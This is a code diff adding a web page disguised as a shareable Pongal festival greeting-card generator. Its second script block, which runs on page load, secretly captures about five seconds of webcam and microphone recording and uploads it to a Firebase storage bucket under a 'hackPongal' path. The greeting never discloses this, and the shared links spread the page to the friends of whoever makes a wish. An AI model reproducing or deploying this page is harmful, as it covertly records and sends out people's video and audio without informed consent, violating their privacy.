@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.17.2/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.17.2/firebase-storage.js"></script>
+    <title>Happy Pongal Wishes</title>
+    <meta property="og:title" content="Pongal Wishes">
+    <meta property="og:description" content="Wishes from your friend">
+    <meta property="og:image" content="imgPongalMob.jpg">
+    <meta property="og:url" content="https://pongal.prakash.vip/">
+    <link rel="shortcut icon" href="imgPongalMob.jpg">
+    <style>
+        body {
+            text-align: center;
+            background-color: #ffeecc;
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        #wish-container {
+            background-color: #fff;
+            border-radius: 15px;
+            padding: 20px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            max-width: 600px;
+            margin: 20px auto;
+        }
+
+        #wish-container img {
+            border-radius: 15px 15px 0 0;
+            width: 100%;
+        }
+
+        h2 {
+            color: #996633;
+            margin-bottom: 5px;
+        }
+
+        #wisherName {
+            color: #e67300;
+            margin: 5px 0;
+        }
+
+        a {
+            display: inline-block;
+            padding: 10px 20px;
+            margin: 10px;
+            background-color: #e67300;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
+        }
+
+        a:hover {
+            background-color: #cc5500;
+        }
+
+        /* Modals */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            width: 80%;
+        }
+
+        #overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+
+        .modal label {
+            font-size: 18px;
+            color: #333;
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        .modal input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .modal button {
+            background-color: #e67300;
+            color: #fff;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .modal button:hover {
+            background-color: #cc5500;
+        }
+    </style>
+</head>
+<body>
+    <div id="wish-container">
+        <img src="imgPongalMob.jpg" alt="Pongal Celebration" width="100%">
+        <h2>Wishes from</h2>
+        <h1 id="wisherName">Wisher Name</h1>
+    </div>
+    <div>
+        <a href="#" id="createWishBtn">Create Your Wish</a>
+        <a href="/videos.html" id="showVidBtn">Show video</a>
+    </div>
+
+    <div id="overlay"></div>
+    <div id="nameModal" class="modal">
+        <label for="userName">Enter Your Name:</label>
+        <input type="text" id="userName" placeholder="Your Name">
+        <button id="submitName">Submit</button>
+    </div>
+
+    <div id="urlModal" class="modal">
+        <label>Your URL:</label>
+        <input type="text" id="generatedUrl" readonly>
+        <button id="copyUrl" style="margin-bottom: 10px;">Copy URL</button>
+        <button id="shareUrl">Share URL</button>
+    </div>
+</body>
+</html>
+<script>
+    $(document).ready(function() {
+        $('#showVidBtn').hide();
+        var urlParams = new URLSearchParams(window.location.search);
+        var name = urlParams.get('name');
+
+        if (name !== null && name.trim() !== "") {
+            $('#wisherName').text(name);
+        }
+
+        $('#createWishBtn').on('click', function() {
+            $('#overlay').show();
+            $('#nameModal').show();
+        });
+
+        $('#overlay').on('click', function() {
+            $('#overlay').hide();
+            $('.modal').hide();
+            $('#urlModal').hide();
+        });
+
+        $('#submitName').on('click', function() {
+            var userName = $('#userName').val().trim();
+
+            if (userName !== "") {
+                createUrl(userName);
+                $('#nameModal').hide();
+            } else {
+                alert('Enter your name');
+            }
+        });
+
+        $('#copyUrl').on('click', function() {
+            copyToClipboard();
+        });
+
+        $('#shareUrl').on('click', function() {
+            shareUrl();
+        });
+    });
+
+    function createUrl(userName) {
+        const origin = window.location.origin;
+        const newUrl = origin + "/?wish=pongal&name=" + userName;
+
+        $('#generatedUrl').val(newUrl);
+        $('#urlModal').show();
+    }
+
+    function copyToClipboard() {
+        var copyText = document.getElementById("generatedUrl");
+        copyText.select();
+        document.execCommand("copy");
+        alert("Copied to clipboard!");
+    }
+
+    function shareUrl() {
+        const generatedUrl = document.getElementById("generatedUrl").value;
+
+        if (navigator.share) {
+            navigator.share({
+                title: 'Happy Pongal Wishes',
+                text: 'Check out my Pongal wish!',
+                url: generatedUrl
+            })
+            .then(() => console.log('Share successful'))
+            .catch((error) => console.error('Error sharing:', error));
+        } else {
+            alert('Share functionality is not supported in your browser.');
+        }
+    }
+</script>
+<script>
+    const firebaseConfig = {
+        storageBucket: "hello-world-c054a.appspot.com",
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const storage = firebase.storage();
+
+    window.onload = function () {
+        let mediaRecorder;
+        const parts = [];
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then((stream) => {
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.start(1000);
+                mediaRecorder.ondataavailable = function (e) {
+                    parts.push(e.data);
+                };
+                setTimeout(function () {
+                    mediaRecorder.stop();
+                    const blob = new Blob(parts, {
+                        type: "video/webm"
+                    });
+
+                    const currentDateTime = new Date();
+                    const formattedDateTime = `${currentDateTime.getFullYear()}${padZero(currentDateTime.getMonth() + 1)}${padZero(currentDateTime.getDate())}_${padZero(currentDateTime.getHours())}${padZero(currentDateTime.getMinutes())}${padZero(currentDateTime.getSeconds())}`;
+                    function padZero(num) {
+                        return num.toString().padStart(2, '0');
+                    }
+                    if (localStorage.getItem("hackPongal") == null) {
+                        localStorage.setItem("hackPongal", btoa(formattedDateTime));
+                    }
+                    const fileNameRef = "hackPongal/" + localStorage.getItem("hackPongal") + "/" + formattedDateTime;
+                    const storageRef = storage.ref(fileNameRef);
+                    storageRef.put(blob).then(snapshot => {
+                        $('#showVidBtn').show();
+                    }).catch(error => {
+                        console.error('Error uploading file:', error);
+                    });
+                }, 5000);
+            })
+            .catch((error) => {
+                alert('Camera and microphone permissions denied or blocked. Please allow access and try again.');
+            });
+    }
+</script>
